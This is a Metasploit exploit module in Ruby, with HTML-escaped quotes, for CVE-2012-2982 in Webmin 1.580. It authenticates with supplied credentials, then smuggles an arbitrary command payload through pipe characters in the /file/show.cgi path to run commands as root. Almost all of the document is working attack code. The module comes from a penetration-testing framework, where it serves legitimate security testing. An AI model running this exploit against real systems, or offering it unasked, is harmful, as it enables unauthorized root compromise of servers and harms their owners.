# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Webmin /file/show.cgi Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an arbitrary command execution vulnerability in Webmin
        1.580. The vulnerability exists in the /file/show.cgi component and allows an
        authenticated user, with access to the File Manager Module, to execute arbitrary
        commands with root privileges. The module has been tested successfully with Webim
        1.580 over Ubuntu 10.04.
      },
      &#039;Author&#039;         => [
        &#039;Unknown&#039;, # From American Information Security Group
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;85248&#039;],
          [&#039;BID&#039;, &#039;55446&#039;],
          [&#039;CVE&#039;, &#039;2012-2982&#039;],
          [&#039;URL&#039;, &#039;http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf&#039;],
          [&#039;URL&#039;, &#039;https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 512,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl bash telnet&#039;,
            }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;Webim 1.580&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Sep 06 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(10000),
          OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
          OptString.new(&#039;USERNAME&#039;,  [true, &#039;Webmin Username&#039;]),
          OptString.new(&#039;PASSWORD&#039;,  [true, &#039;Webmin Password&#039;])
        ], self.class)
  end

  def check

    peer = "#{rhost}:#{rport}"

    print_status("#{peer} - Attempting to login...")

    data = "page=%2F&user=#{datastore[&#039;USERNAME&#039;]}&pass=#{datastore[&#039;PASSWORD&#039;]}"

    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;uri&#039;     => "/session_login.cgi",
        &#039;cookie&#039;  => "testing=1",
        &#039;data&#039;    => data
      }, 25)

    if res and res.code == 302 and res.headers[&#039;Set-Cookie&#039;] =~ /sid/
      print_good "#{peer} - Authentication successful"
      session = res.headers[&#039;Set-Cookie&#039;].split("sid=")[1].split(";")[0]
    else
      print_error "#{peer} - Authentication failed"
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Attempting to execute...")

    command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"

    res = send_request_cgi(
      {
        &#039;uri&#039;     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
        &#039;cookie&#039;  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end

  end

  def exploit

    peer = "#{rhost}:#{rport}"

    print_status("#{peer} - Attempting to login...")

    data = "page=%2F&user=#{datastore[&#039;USERNAME&#039;]}&pass=#{datastore[&#039;PASSWORD&#039;]}"

    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;uri&#039;     => "/session_login.cgi",
        &#039;cookie&#039;  => "testing=1",
        &#039;data&#039;    => data
      }, 25)

    if res and res.code == 302 and res.headers[&#039;Set-Cookie&#039;] =~ /sid/
      session = res.headers[&#039;Set-Cookie&#039;].scan(/sid\=(\w+)\;*/).flatten[0] || &#039;&#039;
      if session and not session.empty?
        print_good "#{peer} - Authentication successfully"
      else
        print_error "#{peer} - Authentication failed"
        return
      end
      print_good "#{peer} - Authentication successfully"
    else
      print_error "#{peer} - Authentication failed"
      return
    end

    print_status("#{peer} - Attempting to execute the payload...")

    command = payload.encoded

    res = send_request_cgi(
      {
        &#039;uri&#039;     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
        &#039;cookie&#039;  => "sid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      print_good "#{peer} - Payload executed successfully"
    else
      print_error "#{peer} - Error executing the payload"
      return
    end

  end

end



